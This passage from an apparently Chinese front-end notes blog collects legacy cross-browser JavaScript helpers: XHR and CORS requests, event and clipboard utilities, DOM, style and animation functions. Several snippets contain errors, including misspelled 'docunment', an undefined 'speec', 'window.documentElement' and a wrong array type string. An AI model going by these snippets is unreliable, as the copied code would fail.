class="keyword">try</span>&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">new</span> ActiveXObject(<span class="string">"Msxml2.XMLHTTP.6.0"</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">catch</span> (e)&#123;&#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">try</span>&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">new</span> ActiveXObject(<span class="string">"Msxml2.XMLHTTP.3.0"</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">catch</span> (e)&#123;&#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">try</span>&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">new</span> ActiveXObject(<span class="string">"Msxml2.XMLHTTP"</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">catch</span> (e)&#123;&#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> XMLHttpRequest();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="请求对象的属性和方法设置"><a href="#请求对象的属性和方法设置" class="headerlink" title="请求对象的属性和方法设置"></a>请求对象的属性和方法设置</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> xhr=createXHR();</span><br><span class="line">xhr.onreadystatechange=<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;<span class="comment">//firfox引入onlaod，readyState==4时触发,代替onreadystatechange</span></span><br><span class="line"><span class="keyword">if</span>(xhr.readyState==<span class="number">4</span>)&#123;</span><br><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line"><span class="keyword">if</span>((xhr.status&gt;=<span class="number">200</span>&amp;&amp;xhr.status&lt;<span class="number">300</span>)||xhr.status==<span class="number">304</span>)&#123;</span><br><span class="line">alert(xhr.responseText);</span><br><span class="line">&#125;<span class="keyword">else</span> &#123;</span><br><span class="line">alert(<span class="string">"unsuccessful"</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;<span class="keyword">catch</span>(ex)&#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">xhr.onload=<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="keyword">if</span>((xhr.status&gt;=<span class="number">200</span>&amp;&amp;xhr.status&lt;<span class="number">300</span>)||xhr.status==<span class="number">304</span>)&#123;</span><br><span class="line">alert(xhr.responseText);</span><br><span class="line">&#125;<span class="keyword">else</span> &#123;</span><br><span class="line">alert(<span class="string">"unsuccessful"</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">xhr.onprogress=<span class="function"><span class="keyword">function</span>(<span class="params">event</span>)</span>&#123;</span><br><span class="line"><span class="keyword">if</span>(event.lengthComputable)&#123;<span class="comment">//进度信息是否可用</span></span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">"Received"</span>+event.position+<span class="string">"of"</span>+event.totalSize);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">xhr.onerror=<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">alert(<span class="string">"error"</span>);</span><br><span class="line">&#125;</span><br><span class="line">xhr.timeout=<span class="number">1000</span>;</span><br><span class="line">xhr.ontimeout=<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">alert(<span class="string">"timeout"</span>);</span><br><span class="line">&#125;</span><br><span class="line">xhr.open(<span class="string">"get"</span>,<span class="string">"example.php"</span>,<span class="literal">true</span>);</span><br><span class="line">xhr.overrideMimeType(<span class="string">"text/xml"</span>);</span><br><span class="line">xhr.send(<span class="literal">null</span>);<span class="comment">//GET</span></span><br></pre></td></tr></table></figure><h2 id="发送表单数据"><a href="#发送表单数据" class="headerlink" title="发送表单数据"></a>发送表单数据</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> form=<span class="built_in">document</span>.getElementById(<span class="string">"info"</span>);</span><br><span class="line">xhr.send(serialize(form));<span class="comment">//第一种写法</span></span><br><span class="line">xhr.send(<span class="keyword">new</span> FormData(form));<span class="comment">//第二种写法</span></span><br></pre></td></tr></table></figure><h2 id="跨浏览器的CORS"><a href="#跨浏览器的CORS" class="headerlink" title="跨浏览器的CORS"></a>跨浏览器的CORS</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">createCORSRequest</span>(<span class="params">method,url</span>)</span>&#123;</span><br><span class="line"><span class="keyword">var</span> xhr=<span class="keyword">new</span> XMLHttpRequest();</span><br><span class="line"><span class="keyword">if</span>(<span class="string">"withCredentials"</span> <span class="keyword">in</span> xhr)&#123;</span><br><span class="line">        xhr.withCredentials = <span class="literal">true</span>;<span class="comment">//默认情况下，这样的跨域无法带上目标域的会话（Cookies 等），需要设置xhr 实例的withCredentials 属性为true（IE 还不支持）</span></span><br><span class="line">xhr.open(method,url,<span class="literal">true</span>);<span class="comment">//第三个参数，true 表示异步，false 表示同步</span></span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="keyword">typeof</span> XDomainRequest !=<span class="string">"undefined"</span>)&#123;</span><br><span class="line">xhr=<span class="keyword">new</span> XDomainRequest();</span><br><span class="line">xhr.open(method,url);</span><br><span class="line">&#125;<span class="keyword">else</span> &#123;</span><br><span class="line">xhr=<span class="literal">null</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> xhr;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> request=createCORSRequest(<span class="string">"get"</span>,<span class="string">"http://www.somewhere"</span>);</span><br><span class="line"><span class="keyword">if</span>(request)&#123;</span><br><span class="line">request.onload=<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;&#125;;<span class="comment">// 请求成功后</span></span><br><span class="line">request.send();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="跨浏览器事件处理程序"><a href="#跨浏览器事件处理程序" class="headerlink" title="跨浏览器事件处理程序"></a>跨浏览器事件处理程序</h2> <figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> eventUtil=&#123;</span><br><span class="line"><span class="comment">// 页面加载完成后</span></span><br><span class="line">    readyEvent : <span class="function"><span class="keyword">function</span>(<span class="params">fn</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (fn==<span class="literal">null</span>) &#123;</span><br><span class="line">            fn=<span class="built_in">document</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">var</span> oldonload = <span class="built_in">window</span>.onload;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">typeof</span> <span class="built_in">window</span>.onload != <span class="string">'function'</span>) &#123;</span><br><span class="line">            <span class="built_in">window</span>.onload = fn;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="built_in">window</span>.onload = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">                oldonload();</span><br><span class="line">                fn();</span><br><span class="line">            &#125;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;,</span><br><span class="line"></span><br><span class="line">    addEventHandler: <span class="function"><span class="keyword">function</span> (<span class="params">obj, eventName, handler</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">document</span>.attachEvent) &#123;<span class="comment">//IE</span></span><br><span class="line">            obj.attachEvent(<span class="string">"on"</span> + eventName, handler);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">document</span>.addEventListener) &#123;<span class="comment">//DOM2级</span></span><br><span class="line">            obj.addEventListener(eventName, handler, <span class="literal">false</span>);<span class="comment">//false- 默认。事件句柄在冒泡阶段执行</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;<span class="comment">//DOM0级</span></span><br><span class="line">            obj[<span class="string">'on'</span>+eventName]=handler;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;,</span><br><span class="line"></span><br><span class="line">    removeEventHandler:<span class="function"><span class="keyword">function</span>(<span class="params">obj, eventName, handler</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">document</span>.attachEvent) &#123;<span class="comment">//IE</span></span><br><span class="line">            obj.detachEvent(<span class="string">"on"</span> + eventName, handler);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">document</span>.addEventListener) &#123;<span class="comment">//DOM2级</span></span><br><span class="line">            obj.removeEventListener(eventName, handler, <span class="literal">false</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;<span class="comment">//DOM0级</span></span><br><span class="line">            obj[<span class="string">'on'</span>+eventName]=<span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">   <span class="comment">//获取event对象的引用，取到事件的所有信息，确保随时能使用event；</span></span><br><span class="line">    getEvent: <span class="function"><span class="keyword">function</span> (<span class="params">e</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> ev = e || <span class="built_in">window</span>.event;</span><br><span class="line">        <span class="keyword">if</span> (!ev) &#123;</span><br><span class="line">            <span class="keyword">var</span> c = <span class="keyword">this</span>.getEvent.caller;</span><br><span class="line">            <span class="keyword">while</span> (c) &#123;</span><br><span class="line">                ev = c.arguments[<span class="number">0</span>];</span><br><span class="line">                <span class="keyword">if</span> (ev &amp;&amp; Event == ev.constructor) &#123;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                c = c.caller;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ev;</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="comment">//事件类型</span></span><br><span class="line">    getType: <span class="function"><span class="keyword">function</span> (<span class="params">e</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> e.type;</span><br><span class="line"></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="comment">//调用事件的元素</span></span><br><span class="line">    getElement: <span class="function"><span class="keyword">function</span> (<span class="params">e</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> e.target|| e.srcElement;</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="comment">//阻止默认事件</span></span><br><span class="line">    preventDefault: <span class="function"><span class="keyword">function</span> (<span class="params">e</span>) </span>&#123;</span><br><span class="line">        e= <span class="keyword">this</span>.getEvent(e);</span><br><span class="line">        <span class="keyword">if</span>(e.preventDefault)&#123;</span><br><span class="line">            e.preventDefault();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> e.returnValue=<span class="literal">false</span>;<span class="comment">//IE</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="comment">//阻止冒泡</span></span><br><span class="line">    stopPropagation:<span class="function"><span class="keyword">function</span>(<span class="params">e</span>) </span>&#123;</span><br><span class="line">      <span class="keyword">if</span>(e.stopPropagation)&#123;</span><br><span class="line">          e.stopPropagation();</span><br><span class="line">      &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">          e.cancelBubble=<span class="literal">true</span>;<span class="comment">//IE</span></span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="comment">//键盘事件键盘的编号</span></span><br><span class="line">    getCharCode:<span class="function"><span class="keyword">function</span> (<span class="params">e</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">typeof</span> e.charCode==<span class="string">"number"</span>)<span class="keyword">return</span> e.charCode;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">return</span> e.keyCode;</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="comment">//获取剪贴板的文本</span></span><br><span class="line">    getClipbordText:<span class="function"><span class="keyword">function</span>(<span class="params">e</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> clipboardData=(e.clipboardData||<span class="built_in">window</span>.clipboardData);</span><br><span class="line">    <span class="keyword">return</span> clipboardData.getData(<span class="string">"text"</span>);</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="comment">//设置剪贴板文本</span></span><br><span class="line">    setClipboardText:<span class="function"><span class="keyword">function</span>(<span class="params">e,value</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(e.clipboardData)&#123;</span><br><span class="line">    <span class="keyword">return</span> e.clipboardData.setData(<span class="string">"text/plain"</span>,value);</span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="built_in">window</span>.clipboardData)&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">window</span>.clipboardData.setData(<span class="string">"text"</span>,value);</span><br><span class="line">    &#125;</span><br><span class="line">    &#125;,</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="处理target-srcelemnt问题，代替this"><a href="#处理target-srcelemnt问题，代替this" class="headerlink" title="处理target/srcelemnt问题，代替this"></a>处理target/srcelemnt问题，代替this</h2> <figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getActivatedObject</span>(<span class="params">e</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> obj;</span><br><span class="line">    <span class="keyword">if</span> (!e) &#123;</span><br><span class="line">        <span class="comment">// early version of IE</span></span><br><span class="line">        obj = <span class="built_in">window</span>.event.srcElement;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (e.srcElement) &#123;</span><br><span class="line">        <span class="comment">// IE 7 or later</span></span><br><span class="line">        obj = e.srcElement;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// DOM Level 2 browser</span></span><br><span class="line">        obj = e.target;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> obj;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="实现insertAfter"><a href="#实现insertAfter" class="headerlink" title="实现insertAfter"></a>实现insertAfter</h2> <figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 把newElement插在targetElement后面 ,js的API只有insertBefore，没有insertAfter</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">insertAfter</span>(<span class="params">newElement,targetElement</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> parent = targetElement.parentNode;</span><br><span class="line">    <span class="keyword">if</span> (parent.lastChild == targetElement) &#123;</span><br><span class="line">        parent.appendChild(newElement);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        parent.insertBefore(newElement,targetElement.nextSibling);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="给element加上类名"><a href="#给element加上类名" class="headerlink" title="给element加上类名"></a>给element加上类名</h2> <figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">addClass</span>(<span class="params">element,value</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!element.className) &#123;</span><br><span class="line">        element.className = value;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        newClassName = element.className;</span><br><span class="line">        newClassName+= <span class="string">" "</span>;</span><br><span class="line">        newClassName+= value;</span><br><span class="line">        element.className = newClassName;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="判断是不是数组"><a href="#判断是不是数组" class="headerlink" title="判断是不是数组"></a>判断是不是数组</h2> <figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">isArray</span>(<span class="params">arg</span>) </span>&#123;</span><br><span class="line"><span class="comment">//return Object.prototype.toString.call(arr)=='[Object Array]';这种方法也可以</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">typeof</span> arg == <span class="string">'object'</span>) &#123;</span><br><span class="line">        <span class="comment">//所有数组都有一个包含单词'arry'的constructor,最后的i表示不区分大小写</span></span><br><span class="line">        <span class="keyword">var</span> criteria = arg.constructor.toString().match(<span class="regexp">/array/i</span>);</span><br><span class="line">        <span class="keyword">return</span> (criteria != <span class="literal">null</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="IE10之前不支持docunment-getElementByClassName"><a href="#IE10之前不支持docunment-getElementByClassName" class="headerlink" title="IE10之前不支持docunment.getElementByClassName"></a>IE10之前不支持docunment.getElementByClassName</h2> <figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getByClass</span>(<span class="params">clsName,parent</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(docunment.getElementByClassName) <span class="keyword">return</span> docunment.getElementByClassName(clsName);</span><br><span class="line">    <span class="comment">//IE10之前</span></span><br><span class="line">    <span class="keyword">var</span> oParent=parent?<span class="built_in">document</span>.getElementById(parent):<span class="built_in">document</span>,</span><br><span class="line">        eles=[],</span><br><span class="line">        elements=oParent.getElementsByTagName(<span class="string">'*'</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">0</span>,l=elements.length;i&lt;l;i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(elements[i].className==clsName)&#123;</span><br><span class="line">            eles.push(elements[i]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> eles;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="获取css样式"><a href="#获取css样式" class="headerlink" title="获取css样式"></a>获取css样式</h2> <figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getStyle</span>(<span class="params">obj,attr</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(obj.currentStyle) &#123;<span class="comment">//IE 浏览器</span></span><br><span class="line">        <span class="keyword">return</span> obj.currentStyle[attr];</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;<span class="comment">//Firefox浏览器</span></span><br><span class="line">        <span class="keyword">return</span> getComputedStyle(obj,<span class="literal">false</span>)[attr];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="手写动画"><a href="#手写动画" class="headerlink" title="手写动画"></a>手写动画</h2><p>多个属性同时运动需要用到JSON,并且所有运动达到目标值才能停止</p> <figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//动画 startMove(oLi,&#123;width:400,height:200,opacity:100&#125;)</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">startMove</span>(<span class="params">obj,json,fn</span>)</span>&#123;</span><br><span class="line">    clearInterval(obj.timer);</span><br><span class="line">    obj.timer=setInterval(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">var</span> attr <span class="keyword">in</span> json)&#123;</span><br><span class="line">            <span class="comment">//1.取当前的值</span></span><br><span class="line">            <span class="keyword">var</span> cur=<span class="number">0</span>;</span><br><span class="line">            <span class="keyword">if</span>(attr==<span class="string">'opacity'</span>)&#123;</span><br><span class="line">                cur=<span class="built_in">Math</span>.round(<span class="built_in">parseFloat</span>(getStyle(obj,attr))*<span class="number">100</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> &#123;</span><br><span class="line">                cur=<span class="built_in">parseInt</span>(getStyle(obj,attr));</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">//2.算速度</span></span><br><span class="line">            <span class="keyword">var</span> speed=(json[attr]-cur)/<span class="number">8</span>;</span><br><span class="line">            speed=speed&gt;<span class="number">0</span>?<span class="built_in">Math</span>.ceil(speed):<span class="built_in">Math</span>.floor(speed);</span><br><span class="line">            <span class="comment">//3.检测停止</span></span><br><span class="line">            <span class="keyword">var</span> flag=<span class="literal">true</span>;</span><br><span class="line">            <span class="keyword">if</span>(cur!=json[attr])&#123;<span class="comment">//使得所有属性做完运动才结束</span></span><br><span class="line">                flag=<span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(attr==<span class="string">'opacity'</span>)&#123;</span><br><span class="line">                obj.style.filter=<span class="string">'alpha(opacity:'</span>+(cur+speec)+<span class="string">')'</span>;</span><br><span class="line">                obj.style.opacity=(cur+speed)/<span class="number">100</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                obj.style[attr]=(cur+speed)+<span class="string">'px'</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(flag)&#123;</span><br><span class="line">            clearInterval(obj.timer);</span><br><span class="line">            <span class="keyword">if</span>(fn)&#123;</span><br><span class="line">                fn();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="取得窗口左边和上边的位置"><a href="#取得窗口左边和上边的位置" class="headerlink" title="取得窗口左边和上边的位置"></a>取得窗口左边和上边的位置</h2> <figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> leftPos=(<span class="keyword">typeof</span> <span class="built_in">window</span>.screenLeft ==<span class="string">"number"</span>)?<span class="built_in">window</span>.screenLeft:<span class="built_in">window</span>.screenX;</span><br></pre></td></tr></table></figure><h2 id="取得页面视口大小"><a href="#取得页面视口大小" class="headerlink" title="取得页面视口大小"></a>取得页面视口大小</h2> <figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> pageWidth=<span class="built_in">window</span>.innerWidth,</span><br><span class="line">    pageHeight=<span class="built_in">window</span>.innerHeight;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">typeof</span> pageHeight!=<span class="string">"number"</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">document</span>.compatMode==<span class="string">"CSS1Compat"</span>)&#123;<span class="comment">//标准模式</span></span><br><span class="line">    pageHeight=<span class="built_in">window</span>.documentElement.clientHeight;</span><br><span class="line">    pageWidth=<span class="built_in">window</span>.documentElement.clientWidth;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;<span class="comment">//BackCompat</span></span><br><span class="line">    pageHeight=<span class="built_in">window</span>.body.clientHeight;</span><br><span class="line">    pageWidth=<span class="built_in">window</span>.body.clientWidth;</span><br><span class="line">    &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h2 id="检测插件方法"><a href="#检测插件方法" class="headerlink" title="检测插件方法"></a>检测插件方法</h2> <figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span 